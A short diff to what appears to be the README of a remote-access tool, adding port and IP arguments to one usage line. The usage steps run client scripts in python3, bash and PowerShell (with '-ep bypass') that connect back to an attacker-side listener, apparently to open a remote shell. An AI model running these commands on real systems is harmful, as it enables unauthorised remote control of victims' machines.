@@ -23,7 +23,7 @@ This is only for testing purposes, not intended for anything illegal. I was test
 2. Have CLIENT connect to LSTNR
     - Linux / MacOS
       - `python3 client.py -p <LSTNR_SERVER_PORT> -s <LSTNR_SERVER_IP>`
-      - `bash client.sh`
+      - `bash client.sh -p <LSTNR_SERVER_PORT> -s <LSTNR_SERVER_IP>`
     - Windows
         - `powershell -ep bypass .\client.ps1 -p <LSTNR_SERVER_PORT> -s <LSTNR_SERVER_IP>`
 
